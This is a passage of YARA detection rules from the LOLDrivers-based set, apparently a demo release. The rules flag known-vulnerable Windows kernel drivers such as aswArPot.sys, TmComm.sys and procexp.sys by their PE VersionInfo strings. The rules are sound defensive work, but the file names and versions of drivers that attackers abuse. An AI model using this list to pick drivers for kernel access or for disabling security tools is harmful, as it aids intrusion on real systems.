filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Sunmicrosystemsinc_Vboxusbsys_Virtualboxusbdriver_5B26_RID42B1 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - VBoxUSB.Sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 01:38:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005600690072007400750061006c0042006f007800200055005300420020006400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00530075006e0020004d006900630072006f00730079007300740065006d0073002c00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e00300031 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e00300031 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00560042006f0078005500530042002e005300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005600690072007400750061006c0042006f007800200055005300420020006400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00560042006f0078005500530042002e005300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]00530075006e0020004d006900630072006f00730079007300740065006d0073002c00200049006e0063002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Avastsoftware_Aswarpot_Avastantivirus_3B6E_RID3D71 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - aswArPot.sys, avgArPot.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 21:54:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0041007600610073007400200041006e0074006900200052006f006f0074006b00690074 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0041005600410053005400200053006f006600740077006100720065 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00320030002e0037002e003100310033002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00320030002e0037002e003100310033002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006100730077004100720050006f0074 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0041007600610073007400200041006e00740069007600690072007500730020 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006100730077004100720050006f0074002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028006300290020003200300032003000200041005600410053005400200053006f006600740077006100720065 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule PUA_VULN_Driver_Trendmicroinc_Tmcommsys_Trendmicroeyes_7C73_RID3DB0 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - TmComm.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 22:05:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005400720065006e0064004d006900630072006f00200043006f006d006d006f006e0020004d006f00640075006c0065 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0036002e00370030002e0030002e0031003100320039 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002e00370030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200045007900650073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000200028004300290020002000320030003200300020005400720065006e00640020004d006900630072006f00200049006e0063006f00720070006f00720061007400650064002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and all of them\n}\n\nrule PUA_VULN_Driver_Wistroncorporation_Wirwadrvsys_Wistronrwadriver_D8FC_RID420E : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - WiRwaDrv.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 01:11:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00570069007300740072006f006e00200052005700410020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00570069007300740072006f006e00200043006f00720070006f0072006100740069006f006e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0030002e0030002e0031003000310036 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0030002e0030002e0031003000310036 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00570069005200770061004400720076002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00570069007300740072006f006e00200052005700410020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00570069005200770061004400720076002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000310039002000570069007300740072006f006e00200043006f00720070006f0072006100740069006f006e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Avastsoftware_Aswarpotsys_Avastantivirus_1A42_RID3EB8 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - aswArPot.sys, avgArPot.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 22:49:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0041007600610073007400200061006e0074006900200072006f006f0074006b00690074 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0041005600410053005400200053006f006600740077006100720065 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00310039002e0033002e0034003200330039002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00310039002e0033002e0034003200330039002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006100730077004100720050006f0074002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0041007600610073007400200041006e00740069007600690072007500730020 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006100730077004100720050006f0074002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028006300290020003200300031003900200041005600410053005400200053006f006600740077006100720065 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule PUA_VULN_Driver_Ludashicom_Computerzsys_F14D_RID37A3 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - ComputerZ.Sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 17:47:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004c007500640061007300680069002000530079007300740065006d0020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]006c007500640061007300680069002e0063006f006d } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0036002e00310035002e0031003000340030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0036002e00310035002e0031003000340030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0043006f006d00700075007400650072005a002e005300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]9c8159275e08 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0043006f006d00700075007400650072005a002e005300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]7248674362406709002000280043002900200032003000310030002d00320030003100350020007700770077002e006c007500640061007300680069002e0063006f006d } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Trendmicroinc_Tmcommsys_Trendmicroeyes_EC5F_RID3DCF : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - TmComm.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 22:10:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005400720065006e0064004d006900630072006f00200043006f006d006d006f006e0020004d006f00640075006c0065 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0036002e00370030002e0030002e0031003000370038 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002e00370030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200045007900650073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000320030003100350020005400720065006e00640020004d006900630072006f00200049006e0063006f00720070006f00720061007400650064002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and all of them\n}\n\nrule PUA_VULN_Driver_Avgtechnologiesczsro_Aswarpot_Avginternetsecuritysystem_34E0_RID4506 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - aswArPot.sys, avgArPot.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 03:18:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00410056004700200041006e0074006900200052006f006f0074006b00690074 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00410056004700200054006500630068006e006f006c006f006700690065007300200043005a002c00200073002e0072002e006f002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00320030002e0035002e00390036002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00320030002e0035002e00390036002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006100730077004100720050006f0074 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00410056004700200049006e007400650072006e00650074002000530065006300750072006900740079002000530079007300740065006d0020 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006100730077004100720050006f0074002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000320030002000410056004700200054006500630068006e006f006c006f006700690065007300200043005a002c00200073002e0072002e006f002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule PUA_VULN_Driver_Msi_Ntiolibsys_Ntiolib_D0BD_RID3706 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - NTIOLib.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 17:20:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004e00540049004f004c00690062 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004d00530049 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0030002e0030002e00300031 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0030002e0030002e00300031 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]004e00540049004f004c00690062002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004e00540049004f004c00690062 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]004e00540049004f004c00690062002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000320030003100360020004d006900630072006f002d005300740061007200200049004e00540027004c00200043004f002e002c0020004c00540044002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Windowsrwinddkprovider_Atlaccesssys_Windowsrwinddkdriver_0B57_RID4565 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - atlAccess.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 03:34:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00530069006d0070006c0065002000500043004900200061006300630065007300730020006400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00570069006e0064006f007700730020002800520029002000570069006e00200037002000440044004b002000700072006f00760069006400650072 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0036002e0031002e0037003600300030002e003100360033003800350020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002e0031002e0037003600300030002e00310036003300380035 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00610074006c004100630063006500730073002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00570069006e0064006f007700730020002800520029002000570069006e00200037002000440044004b0020006400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00610074006c004100630063006500730073002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]00a90020004d006900630072006f0073006f0066007400200043006f00720070006f0072006100740069006f006e002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Nvidiacorp_Nvoclocksys_Nvidiasystemutilitydriver_909F_RID4217 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - nvoclock.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 01:13:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004e00560049004400490041002000530079007300740065006d0020005500740069006c0069007400790020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004e0056004900440049004100200043006f00720070002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0036002e00300033002e00300036 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002e00300033002e00300036 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006e0076006f0063006c006f0063006b002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004e00560049004400490041002000530079007300740065006d0020005500740069006c0069007400790020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006e0076006f0063006c006f0063006b002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000a9004e0056004900440049004100200043006f00720070002e00200032003000300033002d0032003000300034 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Zemanaltd_Zam_3C18_RID332A : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - zam64.sys, zamguard32.sys, zamguard64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 14:36:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005a0041004d } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005a0065006d0061006e00610020004c00740064002e } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002e00310036002e003900320038 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005a0041004d } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]005a0065006d0061006e00610020004c00740064002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule PUA_VULN_Driver_Tgsoftsas_Viragtsys_Viritagentsystem_2B4C_RID3D19 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - viragt64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 21:40:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005600690072004900540020004100670065006e0074002000530079007300740065006d } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0054004700200053006f0066007400200053002e0061002e0073002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002c002000370034002c00200030002c00200030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002c002000370034002c00200030002c00200030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]007600690072006100670074002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005600690072004900540020004100670065006e0074002000530079007300740065006d } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]007600690072006100670074002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200054004700200053006f0066007400200053002e0061002e0073002e00200032003000300036002c002000320030003100330020002d0020007700770077002e007400670073006f00660074002e00690074 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Innotekgmbh_Iprt_Virtualboxguestadditions_BBF5_RID3F0D : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - VBoxMouseNT.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 23:03:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005600690072007400750061006c0042006f007800200069003800300034003200200050006f007200740020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0069006e006e006f00740065006b00200047006d00620048 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0035002e0036002e00320038003200340031 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0035002e0036002e00320038003200340031 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00690038003000340032007000720074 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005600690072007400750061006c0042006f00780020004700750065007300740020004100640064006900740069006f006e0073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00560042006f0078004d006f007500730065004e0054002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000300034002d003200300030003700200069006e006e006f00740065006b00200047006d00620048 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Tenasyscorporation_Rtifsys_Intime_9399_RID3BB1 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - rtif.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:40:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0049004e00740069006d006500200050006e00500020005200540020004b00650072006e0065006c00200049006e00740065007200660061006300650020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00540065006e004100730079007300200043006f00720070006f0072006100740069006f006e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0035003000300020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002e0034002e00320031003300340033002e0031 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0072007400690066002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0049004e00740069006d0065 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0072007400690066002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000a900200032003000300032002d0032003000320031002000620079002000540065006e004100730079007300200043006f00720070006f0072006100740069006f006e002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule PUA_VULN_Driver_Dtresearchinc_Iomemsys_Iomemsys_3D23_RID3AA9 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - iomem64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 19:56:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0044005400520020004b00650072006e0065006c0020006d006f006400650020006400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00440054002000520065007300650061007200630068002c00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0032002e0033002e0030002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002e0033002e0030002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0069006f006d0065006d002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0069006f006d0065006d002e007300790073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0069006f006d0065006d002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0044005400200052006500730065006100720063006800200049006e0063002e00200041006c006c0020005200690067006800740073002000520065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Sisoftware_Sandra_Sisoftwaresandra_496F_RID3BEB : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - SANDRA.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:49:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00530061006e006400720061002000440065007600690063006500200044007200690076006500720020002800570069006e003600340020007800360034002900280055006e00690063006f006400650029 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005300690053006f006600740077006100720065 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00310030002e0035002e0031002e00310020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00310030002e0035002e0031002e0031 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00530041004e004400520041 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005300690053006f006600740077006100720065002000530061006e006400720061 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00530041004e004400520041 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000a90020005300690053006f0066007400770061007200650020004c0074006400200031003900390035002d0032003000300036002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Sysinternalswwwsysinternalscom_Procexpsys_Processexplorer_1B00_RID4627 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - procexp.Sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 04:06:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00500072006f00630065007300730020004500780070006c006f007200650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0053007900730069006e007400650072006e0061006c00730020002d0020007700770077002e0073007900730069006e007400650072006e0061006c0073002e0063006f006d } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00310032002e00300030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00310032002e00300030 } \n      $ = { 